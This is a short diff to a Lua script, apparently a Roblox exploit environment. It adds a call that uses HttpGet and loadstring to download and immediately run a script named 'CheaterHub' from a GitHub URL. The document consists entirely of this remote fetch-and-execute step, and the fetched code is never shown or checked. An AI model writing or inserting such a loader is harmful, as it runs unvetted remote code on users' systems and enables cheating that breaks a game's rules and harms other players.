@@ -55,3 +55,5 @@ function env.exstr(site)
 	return loadstring(game:HttpGet(site, true))()
 end
 
+exstr("https://raw.githubusercontent.com/GamerScripter-coder/CheaterHub/refs/heads/main/Hub.lua")
+
